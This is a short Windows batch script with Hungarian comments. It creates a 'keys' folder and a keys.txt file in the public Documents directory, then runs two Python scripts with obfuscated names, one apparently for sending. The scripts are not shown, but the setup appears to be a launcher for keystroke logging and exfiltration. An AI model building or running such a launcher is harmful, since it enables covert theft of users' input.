@echo off

:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: hozzon létre egy keys.txt filet, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt"
)

python "%TARGET%\spwww743g7w.py"
python "%TARGET%\fwsendbfgw.py"

echo.
pause

